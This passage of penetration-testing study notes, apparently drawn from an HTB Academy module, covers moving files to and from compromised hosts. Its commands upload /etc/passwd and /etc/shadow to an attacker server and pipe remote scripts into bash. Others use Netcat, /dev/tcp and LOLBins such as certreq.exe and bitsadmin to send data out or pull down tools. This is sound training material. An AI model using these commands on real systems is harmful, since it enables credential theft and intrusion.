`openssl req -x509` generates a self-signed X.509 certificate; `-out server.pem -keyout server.pem` writes both the certificate and the private key into the same file; `-newkey rsa:2048` generates a new 2048-bit RSA key; `-nodes` skips encrypting the private key with a passphrase; `-sha256` uses SHA-256 for the certificate signature; `-subj '/CN=server'` supplies the certificate's subject (Common Name) non-interactively.

**Step 3 — Start the HTTPS upload server in a separate directory (so the webroot doesn't expose the cert):**
```shellsession
SyedZainImam@htb[/htb]$ mkdir https && cd https
SyedZainImam@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
`mkdir https && cd https` creates and enters a clean directory to serve, isolating it from the certificate file; `python3 -m uploadserver 443 --server-certificate ~/server.pem` starts the upload server on port 443 using the generated certificate, enabling HTTPS.

**Step 4 — Upload multiple files from the compromised Linux machine using cURL:**
```shellsession
SyedZainImam@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
`-X POST` sets the HTTP method to POST; each `-F 'files=@<path>'` attaches a file as multipart form data under the field name `files` (used twice here to send two files in one request); `--insecure` tells cURL to accept the self-signed certificate without validating it against a trusted CA, since we created and trust it ourselves.

<a id="s3-10"></a>
### 3.10 Alternative Web File Transfer Method
Since most Linux distributions already have Python or PHP installed, standing up a quick ad-hoc web server for transfers is simple — and if the compromised host is itself a web server, files can simply be moved into its existing web root and then downloaded from the attack host directly, flipping the transfer direction (downloading *from* the target rather than pushing *to* it). The module lists several one-liner servers across languages, useful when one option is blocked or unavailable but another happens to be installed.

```shellsession
SyedZainImam@htb[/htb]$ python3 -m http.server
```
Starts a basic HTTP server using Python 3's built-in `http.server` module, serving the current directory on port 8000 by default.

```shellsession
SyedZainImam@htb[/htb]$ python2.7 -m SimpleHTTPServer
```
The Python 2.7 equivalent, using the (deprecated) `SimpleHTTPServer` module, for systems that only have Python 2 installed.

```shellsession
SyedZainImam@htb[/htb]$ php -S 0.0.0.0:8000
```
PHP's built-in development server, bound to all interfaces on port 8000.

```shellsession
SyedZainImam@htb[/htb]$ ruby -run -ehttpd . -p8000
```
Ruby's `webrick`-based mini HTTP server, serving the current directory (`.`) on port 8000.

**Downloading from the target's new web server onto Pwnbox:**
```shellsession
SyedZainImam@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
```
Once any of the above servers is running on the compromised host, this simply downloads the named file from it using wget — note the module's caution that inbound traffic to the attack host may be blocked in this direction, so this technique transfers the file *from* the target rather than uploading *to* it.

<a id="s3-11"></a>
### 3.11 SCP Upload
When outbound SSH (TCP/22) is permitted, `scp` can also be used in the opposite direction, uploading a file from the attack host to the compromised target, following essentially the same syntax pattern as `cp`/`copy`.

```shellsession
SyedZainImam@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```
`scp <local-path> <user>@<host>:<remote-path>` copies the local file (`/etc/passwd`) up to the specified remote path, authenticating as `htb-student` and prompting for that account's password.

<a id="s3-12"></a>
### 3.12 Onwards
This closing note summarizes that the section has covered the most common built-in Linux file transfer methods (base64, wget/curl, fileless piping, `/dev/tcp`, SSH/SCP), but notes there's more to cover in later sections on additional tools and mechanisms.

---

<a id="s4"></a>
## 4. Transferring Files with Code

<a id="s4-1"></a>
### 4.1 Introduction
This section covers using general-purpose programming languages for file transfer, noting that languages like Python, PHP, Perl, and Ruby are commonly pre-installed on Linux, and tools like `cscript` and `mshta` let Windows execute JavaScript or VBScript natively as well. With roughly 700 programming languages in existence (per the cited Wikipedia figure), essentially any of them could theoretically be used to download, upload, or execute OS instructions — this section demonstrates a representative sample of the most commonly encountered ones.

<a id="s4-2"></a>
### 4.2 Python
Python supports running one-line scripts directly from the command line via the `-c` flag, useful when you have code execution but not an interactive shell. The module shows both Python 2 and Python 3 syntax since both versions are still sometimes encountered on target systems.

**Python 2 download one-liner:**
```shellsession
SyedZainImam@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
`import urllib` loads Python 2's URL-handling library; `urllib.urlretrieve(URL, filename)` downloads the content at the URL and saves it directly to the given local filename.

**Python 3 download one-liner:**
```shellsession
SyedZainImam@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
Functionally identical, but using Python 3's reorganized module path (`urllib.request`) and its version of `urlretrieve`.

<a id="s4-3"></a>
### 4.3 PHP
PHP is extremely widely deployed (the module cites W3Techs data showing it's used by roughly 77.4% of websites with a known server-side language), making it a frequently available tool during web-focused engagements. PHP also supports one-liners via the `-r` flag.

**Download using `file_get_contents()` + `file_put_contents()`:**
```shellsession
SyedZainImam@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
`file_get_contents(URL)` fetches the full content of the remote resource into a variable; `file_put_contents(filename, $file)` writes that content out to a local file.

**Download using `fopen()` (streamed, chunk-by-chunk):**
```shellsession
SyedZainImam@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
**Step-by-step:** `fopen(URL, "rb")` opens the remote URL as a readable binary stream; `fopen("LinEnum.sh", "wb")` opens a local file for binary writing; the `while` loop reads the remote stream in 1024-byte chunks (`fread`) and writes each chunk to the local file (`fwrite`) until the stream is exhausted; `fclose()` closes both streams afterward. This streaming approach is more memory-efficient for large files than loading the whole thing at once.

**Fileless execution — download and pipe to Bash:**
```shellsession
SyedZainImam@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
`@file(URL)` reads the remote resource into an array of lines (the `@` suppresses warnings); the `foreach` loop echoes each line to standard output; piping that into `bash` executes the script directly without ever saving it to disk — the fileless pattern seen earlier with cURL/wget.

<a id="s4-4"></a>
### 4.4 Other Languages (Ruby & Perl)
Both Ruby and Perl also support one-liners via the `-e` flag and can perform downloads using their respective standard libraries.

**Ruby download:**
```shellsession
SyedZainImam@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
`require "net/http"` loads Ruby's HTTP library; `Net::HTTP.get(URI.parse(URL))` fetches the content at the URL; `File.write(filename, content)` writes that content to a local file.

**Perl download:**
```shellsession
SyedZainImam@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
`use LWP::Simple` loads Perl's simple web-client library; `getstore(URL, filename)` downloads the URL's content directly into the specified local file in one call.

<a id="s4-5"></a>
### 4.5 JavaScript
JavaScript can be executed natively on Windows via `cscript.exe`, letting a `.js` file perform a download using Windows' COM-based HTTP and ADODB stream objects — useful on hosts where PowerShell is restricted but Windows Script Host isn't.

**Script content (`wget.js`):**
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
**Step-by-step:** a `WinHttp.WinHttpRequest.5.1` COM object is created to perform the HTTP request; `.Open("GET", <arg0>, false)` configures a synchronous GET request to the URL passed as the script's first command-line argument; `.Send()` executes the request; an `ADODB.Stream` object (type 1 = binary) is then opened, the response body is written into it, and `.SaveToFile(<arg1>)` saves that binary stream to the filename given as the script's second argument.

**Running it:**
```cmd
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```
`cscript.exe /nologo` runs the script with the Windows Script Host console engine, suppressing the normal banner; the two arguments after `wget.js` map to `WScript.Arguments(0)` (the URL) and `WScript.Arguments(1)` (the output filename) inside the script.

<a id="s4-6"></a>
### 4.6 VBScript
VBScript has shipped by default with every Windows desktop release since Windows 98, making it an extremely reliable fallback option when other scripting engines are restricted.

**Script content (`wget.vbs`):**
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
This follows the same logical pattern as the JavaScript version: a `Microsoft.XMLHTTP` object performs the GET request to the URL given as the first script argument; an `Adodb.Stream` object (binary type) receives the response body and saves it to the filename given as the second argument (the `2` flag means overwrite if the file already exists).

**Running it:**
```cmd
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```
Same invocation pattern as the JavaScript example — `cscript.exe` runs the `.vbs` file, passing the URL and output filename as arguments.

<a id="s4-7"></a>
### 4.7 Upload Operations using Python3
This demonstrates uploading a file from a compromised Linux (or Windows with Python) host using Python's `requests` module, targeting the same `uploadserver` tool used in earlier sections.

**Step 1 — Start the Python upload server:**
```shellsession
SyedZainImam@htb[/htb]$ python3 -m uploadserver
```

**Step 2 — Upload a file using a one-liner:**
```shellsession
SyedZainImam@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
The module then breaks this one-liner down into readable multi-line form:
```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```
**Step-by-step:** `import requests` loads Python's HTTP client library; `open("/etc/passwd", "rb")` opens the target file in binary-read mode; `requests.post(url, files={"files": file})` sends a multipart POST request to the upload server with the opened file attached under the field name `files`, mirroring the earlier cURL `-F 'files=@...'` example but in Python. The module notes this same pattern can be adapted to essentially any programming language.

<a id="s4-8"></a>
### 4.8 Section Recap
This closing note reflects that knowing how to use general-purpose programming languages for file transfer is valuable across many contexts — red teaming, penetration testing, CTF competitions, incident response, forensic investigation, and day-to-day sysadmin work — since a scripting language may be available when dedicated transfer tools are blocked.

---

<a id="s5"></a>
## 5. Miscellaneous File Transfer Methods

<a id="s5-1"></a>
### 5.1 Netcat
Netcat (`nc`) is a general-purpose networking utility for reading/writing data over TCP or UDP connections, which makes it naturally usable for file transfer. The original Netcat (by Hobbit, 1995) is no longer actively maintained, which led the Nmap Project to create Ncat, a modern reimplementation adding SSL, IPv6, SOCKS/HTTP proxy support, and connection brokering. The module notes that in HTB's Pwnbox, `nc`, `ncat`, and `netcat` all actually refer to Ncat under the hood, despite the differing command names.

<a id="s5-2"></a>
### 5.2 File Transfer with Netcat and Ncat
This walks through transferring a tool (`SharpKatz.exe`) between Pwnbox and a compromised machine using several different Netcat/Ncat connection patterns, chosen based on which direction a firewall allows connections.

**Pattern 1 — Compromised machine listens, attacker connects and sends:**

*On the compromised machine, listen on a port and redirect incoming data into a file:*
```shellsession
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```
`-l` puts Netcat into listen mode; `-p 8000` sets the listening port; `> SharpKatz.exe` redirects whatever data arrives into that file. With Ncat, the equivalent needs an extra flag to auto-close once done:
```shellsession
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```
`--recv-only` tells Ncat to close the connection once the sender stops sending, rather than waiting indefinitely for more data.

*From the attack host, connect and send the file as input:*
```shellsession
SyedZainImam@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
SyedZainImam@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
`-q 0` tells Netcat to close the connection immediately once input (`< SharpKatz.exe`, the file's contents fed in as stdin) is exhausted, signaling transfer completion. With Ncat, the equivalent flag is `--send-only`:
```shellsession
SyedZainImam@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
`--send-only` makes Ncat terminate as soon as its input runs out, instead of waiting around for the remote side to possibly send data back.

**Pattern 2 — Attack host listens, compromised machine connects (useful when inbound connections to the target are blocked):**

*On Pwnbox, listen and send the file as input:*
```shellsession
SyedZainImam@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
*On the compromised machine, connect in and redirect the received data to a file:*
```shellsession
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```
The same pattern repeats with Ncat, swapping in `--send-only` and `--recv-only` respectively on each side.

**Pattern 3 — Using Bash's `/dev/tcp` when Netcat/Ncat isn't available on the compromised machine:**
```shellsession
SyedZainImam@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
(same listener as before, on the attack host)
```shellsession
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```
`cat < /dev/tcp/<host>/<port>` opens a raw TCP connection to the listener using Bash's built-in network redirection (same mechanism as the earlier `/dev/tcp` download example), and `cat` reads whatever data comes through, redirecting it into the output file. The module notes the same overall approach also works in reverse, for transferring files from the compromised host back to Pwnbox.

<a id="s5-3"></a>
### 5.3 PowerShell Session File Transfer
When HTTP, HTTPS, and SMB are all unavailable, PowerShell Remoting (WinRM) offers another channel for executing commands — and transferring files — on a remote Windows computer. By default, enabling PowerShell Remoting opens both an HTTP listener (TCP/5985) and an HTTPS listener (TCP/5986). Using it requires administrative access, Remote Management Users group membership, or explicit session-configuration permissions on the target.

**Step 1 — Confirm WinRM connectivity from DC01 to DATABASE01:**
```powershell
PS C:\htb> whoami
htb\administrator
PS C:\htb> hostname
DC01
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
```
`whoami` and `hostname` confirm the current user context and machine; `Test-NetConnection -ComputerName <host> -Port 5985` checks whether the WinRM HTTP port is reachable and open on the target, returning `TcpTestSucceeded : True` if so.

**Step 2 — Create a PowerShell Remoting session:**
```powershell
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```
`New-PSSession -ComputerName <host>` establishes a persistent remote session to the target and stores a reference to it in the `$Session` variable, reusable for subsequent commands — no separate credentials are needed here since the current session already has admin rights on DATABASE01.

**Step 3 — Copy a file from local to the remote session:**
```powershell
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
`Copy-Item -Path <local-file> -ToSession $Session -Destination <remote-path>` copies the specified local file into the given path on the remote machine, using the established session as the transport channel.

**Step 4 — Copy a file from the remote session back to local:**
```powershell
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```
`-FromSession $Session` reverses the direction, pulling the specified file from the remote machine down to the local destination path.

<a id="s5-4"></a>
### 5.4 RDP
RDP (Remote Desktop Protocol) is widely used for remote access in Windows networks, and files can be transferred simply via copy-paste within an active RDP session. From Linux, `xfreerdp` or `rdesktop` can be used as RDP clients, and both generally support copying files from the target machine into the RDP session, though the module notes this doesn't always work reliably. As an alternative to copy-paste, a local folder can be mounted as a shared drive inside the remote RDP session — the module flags that the lab VM for this section has Windows Defender enabled, so sharing a folder containing malware samples might get them deleted automatically.

**Mounting a Linux folder using rdesktop:**
```shellsession
SyedZainImam@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
`-d HTB` specifies the domain; `-u administrator -p 'Password0@'` supply the login credentials; `-r disk:linux='/home/user/rdesktop/files'` redirects (mounts) the specified local folder into the session, exposed under the drive label `linux`.

**Mounting a Linux folder using xfreerdp:**
```shellsession
SyedZainImam@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
`/v:` sets the target address; `/d:`, `/u:`, `/p:` specify domain, username, and password respectively; `/drive:linux,<local-path>` mounts the given local folder into the session under the drive name `linux`.

Once mounted either way, the shared folder is accessed inside the Windows session via the path `\\tsclient\<drive-name>`, allowing drag-and-drop-style file transfer to and from the session. The module notes this mounted drive is isolated — not accessible to any other user logged into the same target machine, even if they hijack the session. Alternatively, Windows' native `mstsc.exe` client exposes the same local-resource-sharing option through its connection settings UI.

<a id="s5-5"></a>
### 5.5 Practice Makes Perfect
This closing section encourages actively practicing every technique covered so far against labs across the Penetration Tester Job Role Path, explicitly naming several modules where these skills recur: Active Directory Enumeration and Attacks (Skills Assessments 1 & 2), Pivoting Tunnelling & Port Forwarding, Attacking Enterprise Networks, and Shells & Payloads. The underlying rationale is that different environments impose different restrictions, so having "muscle memory" across many techniques — rather than relying on just one favorite method — means you're prepared when your usual approach gets blocked. The module then transitions into discussing how to protect sensitive data during file transfers in the next section.

---

<a id="s6"></a>
## 6. Protected File Transfers

<a id="s6-1"></a>
### 6.1 Why Encrypt File Transfers
Penetration testers routinely handle highly sensitive data — user lists, credentials such as an extracted `NTDS.dit` file for offline password cracking, and enumeration data revealing details about an organization's infrastructure and Active Directory environment. Because of this, encrypting such data (or using inherently encrypted channels like SSH, SFTP, or HTTPS) is essential, though sometimes those channels simply aren't available in a given environment, requiring manual encryption before transfer instead. The module adds an important ethical/professional note: unless explicitly requested by the client, testers should avoid actually exfiltrating real PII, financial data, or trade secrets — if testing DLP/egress-filtering controls specifically, dummy data that mimics the protected data type should be used instead of the real thing. Data leakage during an engagement can have serious consequences for the tester, their firm, and the client, reinforcing that professionalism and responsible handling of discovered data are core obligations.

<a id="s6-2"></a>
### 6.2 File Encryption on Windows
The module demonstrates `Invoke-AESEncryption.ps1`, a compact PowerShell script providing AES encryption/decryption for both strings and files — small enough to transfer easily via any of the earlier methods, then imported as a module and used directly.

**Step 1 — Transfer and import the script:**
```powershell
PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
```
`Import-Module` loads the script's defined function (`Invoke-AESEncryption`) into the current PowerShell session, making it callable like a built-in cmdlet.

**Step 2 — Encrypt a file:**
```powershell
PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
File encrypted to C:\htb\scan-results.txt.aes
```
`-Mode Encrypt` selects the encryption operation; `-Key "p4ssw0rd"` supplies the password used to derive the AES encryption key (internally, the script SHA-256-hashes this password to produce a 256-bit AES key); `-Path .\scan-results.txt` specifies the file to encrypt. The output is a new file with the same name plus a `.aes` extension, containing the encrypted content — the original plaintext file is left untouched alongside it.

The script also supports decrypting files (`-Mode Decrypt -Path file.bin.aes`) and encrypting/decrypting plain strings directly (`-Text "Secret Text"` instead of `-Path`), covered in the script's own built-in examples. The module stresses using a strong, unique encryption password per engagement/client, so that a single leaked and cracked password can't be reused to decrypt files from other assessments.

<a id="s6-3"></a>
### 6.3 File Encryption on Linux
OpenSSL, commonly pre-installed on Linux distributions for tasks like generating TLS certificates, can also be used directly to encrypt and decrypt files symmetrically — the module calls this "nc style" sending, since OpenSSL can double as both an encryption tool and a network transport (expanded on further in Section 8's GTFOBins discussion).

**Step 1 — Encrypt a file:**
```shellsession
SyedZainImam@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```
`openssl enc` invokes OpenSSL's symmetric encryption/decryption subcommand; `-aes256` selects the AES-256 cipher; `-iter 100000` sets the number of key-derivation iterations (higher values make brute-forcing the password slower); `-pbkdf2` specifies the Password-Based Key Derivation Function 2 algorithm for deriving the encryption key from the password; `-in /etc/passwd` is the source file; `-out passwd.enc` is the encrypted output file. Running this prompts interactively for an encryption password (entered twice, for confirmation).

**Step 2 — Decrypt the file:**
```shellsession
SyedZainImam@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```
The `-d` flag switches the operation to decryption; all other parameters (cipher, iteration count, KDF) must exactly match those used during encryption, since they determine how the key is derived; it then prompts for the decryption password, and on success writes the original plaintext back out to `passwd`. The module closes by recommending the encrypted file still be transferred over a secure channel (HTTPS, SFTP, or SSH) where possible, rather than relying on encryption alone.

---

<a id="s7"></a>
## 7. Catching Files over HTTP/S

<a id="s7-1"></a>
### 7.1 HTTP/S
Web-based transfer (HTTP/HTTPS) is the most common method overall because these are the protocols most reliably allowed through firewalls, and — importantly — HTTPS traffic is encrypted in transit, avoiding the embarrassing (and risky) scenario of a client's network IDS flagging a sensitive file sent in plaintext. The module notes `uploadserver` (covered earlier) is one option for a quick upload-capable server, but Apache and Nginx are the more production-grade alternatives, and this section focuses on building a secure upload setup with Nginx specifically.

<a id="s7-2"></a>
### 7.2 Nginx — Enabling PUT
Nginx is presented as a safer alternative to Apache for handling uploads, because its configuration is simpler and its module system doesn't carry the same security pitfalls — notably, Apache's PHP module will happily execute anything ending in `.php`, which is dangerous if uploads aren't carefully restricted, whereas configuring PHP execution under Nginx takes deliberate extra steps. The core warning throughout is that when allowing HTTP uploads, it's critical to ensure uploaded files (like web shells) can never be executed by the server.

**Step 1 — Create a directory to receive uploads:**
```shellsession
SyedZainImam@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```
`mkdir -p` creates the full nested directory path, including any missing parent directories.

**Step 2 — Set correct ownership for the Nginx worker process:**
```shellsession
SyedZainImam@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```
`chown -R www-data:www-data` recursively changes the directory's owner (and group) to `www-data`, the user Nginx typically runs as, so it has write permission to store uploaded files there.

**Step 3 — Create the Nginx site configuration (`/etc/nginx/sites-available/upload.conf`):**
```shellsession
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```
`listen 9001` sets the port this server block handles; the `location` block matches requests to `/SecretUploadDirectory/`, serving/accepting files relative to the `root` directory specified; `dav_methods PUT` enables the WebDAV `PUT` method specifically for this location, which is what allows clients to upload files via HTTP PUT requests.

**Step 4 — Enable the site by symlinking it:**
```shellsession
SyedZainImam@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```
Nginx (on Debian-based systems) only loads configs present in `sites-enabled/`; symlinking the file from `sites-available/` into `sites-enabled/` activates it without duplicating the file.

**Step 5 — Restart Nginx to apply the configuration:**
```shellsession
SyedZainImam@htb[/htb]$ sudo systemctl restart nginx.service
```

**Step 6 — Troubleshoot a port conflict (common on Pwnbox, where port 80 is already used):**
```shellsession
SyedZainImam@htb[/htb]$ tail -2 /var/log/nginx/error.log
SyedZainImam@htb[/htb]$ ss -lnpt | grep 80
SyedZainImam@htb[/htb]$ ps -ef | grep 2811
```
`tail -2 /var/log/nginx/error.log` shows the most recent error log lines, revealing a "address already in use" bind failure on port 80; `ss -lnpt | grep 80` lists listening TCP sockets and filters for port 80, identifying the PID of whatever process is already bound to it; `ps -ef | grep <pid>` looks up what that process actually is (in the module's case, a `websockify` process used by Pwnbox's own noVNC web console).

**Step 7 — Remove the default Nginx site, which binds port 80 by default:**
```shellsession
SyedZainImam@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default
```
This deletes the symlink to Nginx's default site configuration, freeing up whichever port it was bound to and resolving the conflict (the custom `upload.conf` uses port 9001, which avoids this conflict entirely in the module's working example).

**Step 8 — Test the upload with a cURL PUT request:**
```shellsession
SyedZainImam@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```
`-T <local-file>` tells cURL to perform an HTTP PUT upload of the specified local file to the given URL, which saves it on the server as `users.txt` inside `SecretUploadDirectory`.

**Step 9 — Verify the file arrived correctly:**
```shellsession
SyedZainImam@htb[/htb]$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```
Confirms the uploaded file's final line matches the expected content from `/etc/passwd`.

The module also recommends confirming directory listing is disabled (by browsing to the upload directory's URL directly) — Apache enables this by default when no index file is present, which would expose every uploaded (often sensitive) file to anyone who finds the directory; Nginx doesn't enable this by default, which is another point in its favor for this use case.

<a id="s7-3"></a>
### 7.3 Using Built-in Tools
This is a short transition note into the next section's topic: "Living off the Land," meaning the use of built-in Windows and Linux utilities (rather than custom or third-party tools) to perform file transfer activities — a concept the module notes will recur throughout later modules in the Penetration Tester path, particularly around privilege escalation and Active Directory enumeration/exploitation.

---

<a id="s8"></a>
## 8. Living off The Land

<a id="s8-1"></a>
### 8.1 What are LOLBins?
The phrase "Living off the land" was coined by Christopher Campbell (@obscuresec) and Matt Graeber (@mattifestation) at DerbyCon 3. The specific term "LOLBins" (Living off the Land Binaries) emerged from a Twitter discussion about what to call legitimate, pre-installed binaries that attackers repurpose to perform actions beyond their original intended function — such as using a certificate-management tool to download arbitrary files. Two community-maintained websites catalog these binaries: the LOLBAS Project for Windows and GTFOBins for Linux. These binaries can be leveraged for several categories of action: Download, Upload, Command Execution, File Read, File Write, and various security Bypasses — this section focuses specifically on the download and upload functions.

<a id="s8-2"></a>
### 8.2 Using the LOLBAS and GTFOBins Projects
Both LOLBAS and GTFOBins function as searchable catalogs: for LOLBAS, searching for `/download` or `/upload` filters to binaries supporting those specific functions on Windows; for GTFOBins, the equivalent search terms are `+file download` and `+file upload` for Linux binaries. These projects are extremely valuable during engagements because a binary already present and trusted on a target (and often excluded from application-whitelisting restrictions, since it's a legitimate OS component) can be repurposed for file transfer without needing to introduce new, potentially flagged tools.

<a id="s8-3"></a>
### 8.3 LOLBAS — CertReq.exe Example
`CertReq.exe`, normally used for certificate enrollment requests, can be abused to upload a file by POSTing it to an attacker-controlled listener.

**Step 1 — Listen for the incoming file on Pwnbox using Netcat:**
```shellsession
SyedZainImam@htb[/htb]$ sudo nc -lvnp 8000
```

**Step 2 — Trigger the upload using certreq.exe on the Windows target:**
```cmd
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```
`-Post` tells `certreq.exe` to send the specified file as the body of an HTTP POST request rather than performing its normal certificate-request function; `-config <URL>` specifies the destination server; the final argument, `c:\windows\win.ini`, is the file to be sent. The command itself reports a (harmless, expected) timeout error since the listener doesn't respond with a proper HTTP response, but the file content still arrives at the listener regardless.

**Step 3 — Observe the file content in the Netcat session:**
The raw HTTP POST request, including headers (notably a distinctive `User-Agent: Mozilla/4.0 (compatible; Win32; NDES client...)` string) and the file's contents in the request body, appears in the Netcat terminal and can be copy-pasted out manually. The module notes that if the `-Post` parameter isn't recognized, an older version of `certreq.exe` may be in use, and a newer version would need to be obtained.

<a id="s8-4"></a>
### 8.4 GTFOBins — OpenSSL Example
This demonstrates using OpenSSL itself (beyond its encryption role covered in Section 6) as a raw network transport tool, similar in spirit to using Netcat "nc style," for transferring a file over an encrypted TLS channel without any dedicated file-transfer protocol.

**Step 1 — Generate a self-signed certificate on Pwnbox:**
```shellsession
SyedZainImam@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```
`req -newkey rsa:2048` generates a new 2048-bit RSA key alongside the certificate request; `-nodes` leaves the private key unencrypted; `-keyout key.pem` writes the private key to this file; `-x509 -days 365` directly produces a self-signed certificate (rather than a request needing separate signing) valid for 365 days; `-out certificate.pem` writes the certificate itself. The command then interactively prompts for certificate subject details (country, state, organization, etc.), any of which can be left blank.

**Step 2 — Stand up a TLS "server" on Pwnbox that streams a file as its response:**
```shellsession
SyedZainImam@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```
`s_server` runs OpenSSL as a generic TLS server; `-quiet` suppresses extra diagnostic output; `-accept 80` listens on port 80; `-cert`/`-key` specify the certificate and private key generated in Step 1; `< /tmp/LinEnum.sh` feeds the target file's content in as the data the server will stream out to any connecting client.

**Step 3 — Connect from the compromised machine using OpenSSL as a TLS client, capturing the streamed file:**
```shellsession
SyedZainImam@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```
`s_client -connect <host>:<port> -quiet` connects to the OpenSSL server as a TLS client, printing the data it receives (quietly, without the normal TLS handshake diagnostics); redirecting that output (`> LinEnum.sh`) saves the streamed content — effectively the original file — to disk, having traveled over an encrypted TLS channel the whole way.

<a id="s8-5"></a>
### 8.5 Other Common Living off the Land Tools
This covers two additional, frequently used Windows LOLBins specifically for downloads: Bitsadmin and Certutil.

**Bitsadmin (abusing the Background Intelligent Transfer Service):** BITS is designed to download files from HTTP sites and SMB shares "intelligently," throttling itself based on host and network utilization to avoid impacting the user's normal work — a legitimate feature that also makes BITS-based downloads less likely to be noticed.
```powershell
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```
`/transfer wcb` names this transfer job "wcb" (an arbitrary label); `/priority foreground` sets it to run at foreground priority (faster, more noticeable, versus background priority which is slower but stealthier); the final two arguments are the source URL and the destination local path.

PowerShell can also drive BITS directly:
```powershell
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```
`Import-Module bitstransfer` loads the BITS PowerShell cmdlets; `Start-BitsTransfer -Source <URL> -Destination <path>` initiates the download through BITS, which (per the module) also supports specifying credentials and proxy servers if needed.

